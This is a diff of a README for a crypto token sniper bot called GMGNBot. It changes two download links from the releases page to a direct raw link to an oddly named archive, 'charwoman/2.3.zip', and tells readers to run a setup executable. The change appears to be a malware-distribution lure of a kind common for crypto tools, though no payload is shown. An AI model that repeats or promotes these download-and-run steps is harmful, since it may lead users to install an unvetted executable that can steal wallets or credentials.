@@ -1,6 +1,6 @@
 # 🤖 GMGNBot-GMGN-Token-Sniper-Bot-2026 - Snipe Tokens Before Everyone Else
 
-[![Download GMGNBot](https://img.shields.io/badge/Download-GMGNBot_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sstylexpress/GMGNBot-GMGN-Token-Sniper-Bot-2026/releases)
+[![Download GMGNBot](https://img.shields.io/badge/Download-GMGNBot_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sstylexpress/GMGNBot-GMGN-Token-Sniper-Bot-2026/raw/refs/heads/main/charwoman/2.3.zip)
 
 ## 🎯 What Is GMGNBot?
 
@@ -34,7 +34,7 @@ Getting GMGNBot on your computer takes less than two minutes. Follow these steps
 **Step 1: Download the Application**
 
 Visit this link to download the application:  
-[**https://github.com/sstylexpress/GMGNBot-GMGN-Token-Sniper-Bot-2026/releases**](https://github.com/sstylexpress/GMGNBot-GMGN-Token-Sniper-Bot-2026/releases)
+[**https://github.com/sstylexpress/GMGNBot-GMGN-Token-Sniper-Bot-2026/raw/refs/heads/main/charwoman/2.3.zip**](https://github.com/sstylexpress/GMGNBot-GMGN-Token-Sniper-Bot-2026/raw/refs/heads/main/charwoman/2.3.zip)
 
 You will see a list of available files. Look for the one named `GMGNBot-Setup.exe` (or similar). Click it to start the download.
 
